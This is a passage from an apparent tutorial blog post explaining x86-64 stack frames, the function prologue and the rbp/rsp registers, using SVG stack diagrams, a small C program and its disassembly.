<text text-anchor='middle' x='352' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='376' y='404' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='376' y='484' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='384' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='484' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='484' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='484' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='484' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='484' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='404' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='440' y='484' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='448' y='404' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='448' y='484' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='456' y='404' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='456' y='484' fill='currentColor' style='font-size:1em'>p</text>
</g>

    </svg>
  
</div>
<p>Let&rsquo;s take another example to understand how this would work for a regular C program.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">func2</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">,</span> <span class="kt">int</span> <span class="n">d</span><span class="p">,</span> <span class="kt">int</span> <span class="n">e</span><span class="p">,</span> <span class="kt">int</span> <span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">g</span><span class="p">,</span> <span class="kt">int</span> <span class="n">h</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">z</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">sum</span> <span class="o">=</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">d</span> <span class="o">+</span> <span class="n">e</span> <span class="o">+</span> <span class="n">f</span> <span class="o">+</span> <span class="n">g</span> <span class="o">+</span> <span class="n">h</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">ch</span> <span class="o">=</span> <span class="sc">&#39;A&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">sum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">func1</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">x</span>  <span class="o">=</span> <span class="nf">func2</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">func1</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This is roughly what the execution flow of the above program will look like&hellip;</p>
<ol>
<li><code>main()</code> calls <code>func1()</code> function without any arguments.</li>
<li><code>func1()</code> function allocates some memory for <code>int x</code> and then calls <code>func2()</code> functions with a single integer type argument.</li>
<li><code>func2()</code> function creates some local variables - both with hardcoded value and using passed arguments.</li>
<li>And then returns a variable back to <code>func1()</code>.</li>
<li>Finally the control is passed back to <code>main()</code>.</li>
</ol>
<p>If you visualise the stack just before the <code>main()</code> function is loaded on stack.. the stack will be something like this:-</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 488 137"
      >
      <g transform='translate(8,16)'>
<circle cx='200' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='200' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='216' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='216' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='232' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='232' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='248' cy='64' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='248' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<text text-anchor='middle' x='0' y='20' fill='currentColor' style='font-size:1em'>#</text>
<text text-anchor='middle' x='8' y='20' fill='currentColor' style='font-size:1em'>#</text>
<text text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'>B</text>
<text text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='32' y='84' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='32' y='100' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='40' y='84' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='40' y='100' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='48' y='84' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='48' y='100' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='56' y='84' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='56' y='100' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='64' y='84' fill='currentColor' style='font-size:1em'>k</text>
<text text-anchor='middle' x='64' y='100' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='72' y='100' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='80' y='84' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='80' y='100' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='88' y='84' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='88' y='100' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='96' y='84' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='104' y='20' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='104' y='84' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='104' y='100' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='112' y='84' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='112' y='100' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='120' y='20' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='120' y='100' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='128' y='20' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='128' y='84' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='128' y='100' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='136' y='84' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='136' y='100' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='144' y='84' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='144' y='100' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='152' y='100' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='160' y='100' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='184' y='52' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='184' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='192' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='200' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='20' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='208' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='216' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='224' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='232' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='20' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='240' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='248' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='52' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='344' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='344' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='344' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='344' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='376' y='52' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='376' y='100' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='384' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='52' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='52' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='456' y='100' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='464' y='52' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='464' y='100' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='472' y='52' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='472' y='100' fill='currentColor' style='font-size:1em'>p</text>
</g>

    </svg>
  
</div>
<p>After this, the <code>main()</code> function loads its variables on the stack.. this will cause the return address to be loaded on to the stack, which will be used once the <code>main()</code> function has completed it&rsquo;s execution&hellip; This is the address which tells where to go back once the <code>main()</code> function returns. Visually the stack will look something like this.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 584 105"
      >
      <g transform='translate(8,16)'>
<circle cx='184' cy='16' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='184' cy='32' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='200' cy='16' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='200' cy='32' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='216' cy='16' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='216' cy='32' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='232' cy='16' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='232' cy='32' r='6' stroke='currentColor' fill='currentColor'></circle>
<text text-anchor='middle' x='16' y='36' fill='currentColor' style='font-size:1em'>S</text>
<text text-anchor='middle' x='16' y='52' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='24' y='36' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='24' y='52' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='32' y='36' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='32' y='52' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='40' y='36' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='40' y='52' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='48' y='36' fill='currentColor' style='font-size:1em'>k</text>
<text text-anchor='middle' x='48' y='52' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='56' y='52' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='64' y='36' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='64' y='52' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='72' y='36' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='72' y='52' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='80' y='36' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='88' y='36' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='88' y='52' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='96' y='36' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='96' y='52' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='104' y='52' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='112' y='36' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='112' y='52' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='120' y='36' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='120' y='52' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='128' y='36' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='128' y='52' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='136' y='52' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='144' y='52' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='168' y='4' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='68' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='192' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='68' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='200' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='68' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='208' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='68' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='216' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='68' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='224' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='68' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='232' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='68' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='248' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='68' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='256' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='68' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='264' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='68' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='272' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='68' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='280' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='68' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='288' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='68' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='296' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='4' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='4' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='328' y='20' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='328' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='328' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='328' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='328' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='352' y='68' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='360' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='68' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='440' y='68' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='448' y='68' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='472' y='68' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='480' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='68' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='560' y='68' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='568' y='68' fill='currentColor' style='font-size:1em'>p</text>
</g>

    </svg>
  
</div>
<p>Notice that the <code>rbp</code> and <code>rsp</code> are also moved&hellip; <code>rsp</code> will move where the stack&rsquo;s top is&hellip; and <code>rbp</code> will point to the base of the current stack frame. This is what the loading of a function looks like. This is called <a href="https://en.wikipedia.org/wiki/Function_prologue_and_epilogue#Prologue"><strong>Prologue</strong></a></p>
<p>Now the <code>rip</code> (64-bit instruction pointer) will point to <code>main()</code> function&rsquo;s code block and will execute those instructions one by one. This will push more values to stack as required&hellip; not all things are needed to be added to stack. We only push those values to stack which we need to save for later use and then pop when it is no longer required.</p>
<p>Looking at the disassembly of <code>main()</code> function will help us to understand more what will be added to stack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0000000000001153</span> <span class="err">&lt;</span><span class="nf">main</span><span class="err">&gt;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="err">1153:</span>       <span class="err">55</span>                      <span class="nf">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">    <span class="err">1154:</span>       <span class="err">48</span> <span class="err">89</span> <span class="nf">e5</span>                <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">    <span class="err">1157:</span>       <span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">    <span class="err">115</span><span class="nl">c:</span>       <span class="nf">e8</span> <span class="no">da</span> <span class="no">ff</span> <span class="no">ff</span> <span class="no">ff</span>          <span class="no">call</span>   <span class="mh">113b</span> <span class="p">&lt;</span><span class="no">func1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="err">1161:</span>       <span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">    <span class="err">1166:</span>       <span class="err">5</span><span class="nf">d</span>                      <span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">    <span class="err">1167:</span>       <span class="nf">c3</span>                      <span class="no">ret</span>
</span></span></code></pre></div><p>Here, the above 2 lines make what we call <strong>Prologue</strong>. This pushes previous <code>rbp</code> to stack (stores returning point) and then updates the <code>rbp</code> with current <code>rsp</code> (stack pointer) value.</p>
<p>then it moves <code>0x00</code> to <code>eax</code> register&hellip; Purpose of this is to reset <code>eax</code> register as <code>0</code> so that when the <code>func1</code> returns, we are sure that it is not a garbage value. <em>Remember:- <code>eax</code> is another general purpose register that is used by called functions to save the return value. This then can be read by the caller function to know what that function returned.</em></p>
<p>After reseting <code>eax</code>, it <code>call</code>s <code>func1()</code> function&hellip; this will transfer the control to <code>func1()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">000000000000116</span><span class="nf">a</span> <span class="err">&lt;</span><span class="no">func1</span><span class="err">&gt;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="err">116</span><span class="nl">a:</span>       <span class="err">55</span>                      <span class="nf">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">    <span class="err">116</span><span class="nl">b:</span>       <span class="err">48</span> <span class="err">89</span> <span class="nf">e5</span>                <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">    <span class="err">116</span><span class="nl">e:</span>       <span class="err">48</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">10</span>             <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x10</span>
</span></span><span class="line"><span class="cl">    <span class="err">1172:</span>       <span class="err">6</span><span class="nf">a</span> <span class="mi">08</span>                   <span class="no">push</span>   <span class="mi">0x8</span>
</span></span><span class="line"><span class="cl">    <span class="err">1174:</span>       <span class="err">6</span><span class="nf">a</span> <span class="mi">07</span>                   <span class="no">push</span>   <span class="mi">0x7</span>
</span></span><span class="line"><span class="cl">    <span class="err">1176:</span>       <span class="err">41</span> <span class="nf">b9</span> <span class="mi">06</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       <span class="no">mov</span>    <span class="no">r9d</span><span class="p">,</span><span class="mi">0x6</span>
</span></span><span class="line"><span class="cl">    <span class="err">117</span><span class="nl">c:</span>       <span class="err">41</span> <span class="nf">b8</span> <span class="mi">05</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       <span class="no">mov</span>    <span class="no">r8d</span><span class="p">,</span><span class="mi">0x5</span>
</span></span><span class="line"><span class="cl">    <span class="err">1182:</span>       <span class="nf">b9</span> <span class="mi">04</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">ecx</span><span class="p">,</span><span class="mi">0x4</span>
</span></span><span class="line"><span class="cl">    <span class="err">1187:</span>       <span class="nf">ba</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span><span class="mi">0x3</span>
</span></span><span class="line"><span class="cl">    <span class="err">118</span><span class="nl">c:</span>       <span class="nf">be</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x2</span>
